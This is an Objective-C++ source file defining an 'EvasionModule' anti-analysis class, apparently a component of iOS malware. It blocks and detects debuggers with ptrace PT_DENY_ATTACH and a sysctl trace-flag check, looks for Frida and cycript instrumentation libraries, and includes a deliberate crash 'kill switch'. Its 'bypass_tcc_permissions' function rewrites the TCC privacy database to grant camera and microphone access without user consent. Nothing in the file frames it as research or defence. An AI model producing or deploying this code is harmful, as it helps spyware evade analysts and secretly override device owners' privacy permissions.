#import <Foundation/Foundation.h>
#import <sys/sysctl.h>
#import <mach-o/dyld.h>
#import <sqlite3.h>
#include <iostream>
#include <string>
#include <vector>

extern "C" int ptrace(int request, pid_t pid, caddr_t addr, int data);
#define PT_DENY_ATTACH 31

namespace EvasionModule {
    class AntiAnalysis {
    public:
        bool is_debugger_attached() {
            int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
            struct kinfo_proc info;
            size_t size = sizeof(info);
            info.kp_proc.p_flag = 0;
            sysctl(mib, 4, &info, &size, NULL, 0);
            if (info.kp_proc.p_flag & P_TRACED) return true; 
            return false;
        }

        void deny_debugger() {
            ptrace(PT_DENY_ATTACH, 0, 0, 0);
        }

        bool is_frida_present() {
            uint32_t count = _dyld_image_count();
            for (uint32_t i = 0; i < count; i++) {
                const char *image_name = _dyld_get_image_name(i);
                if (image_name != NULL) {
                    std::string img(image_name);
                    if (img.find("Frida") != std::string::npos || img.find("cycript") != std::string::npos) return true;
                }
            }
            return false;
        }

        bool bypass_tcc_permissions() {
            std::string tcc_db_path = "/private/var/mobile/Library/TCC/TCC.db";
            sqlite3 *db;
            if (sqlite3_open(tcc_db_path.c_str(), &db) != SQLITE_OK) return false;
            std::string sql = "INSERT OR REPLACE INTO access (service, client, client_type, auth_value) VALUES ('kTCCServiceCamera', 'com.apple.mobileslideshow', 0, 2), ('kTCCServiceMicrophone', 'com.apple.mobileslideshow', 0, 2);";
            char *errMsg = 0;
            sqlite3_exec(db, sql.c_str(), NULL, 0, &errMsg);
            sqlite3_close(db);
            return true;
        }

        void kill_switch() {
            int *p = NULL;
            *p = 0; 
        }

        bool check_environment() {
            deny_debugger();
            if (is_debugger_attached()) return false;
            if (is_frida_present()) return false;
            return true;
        }
    };
}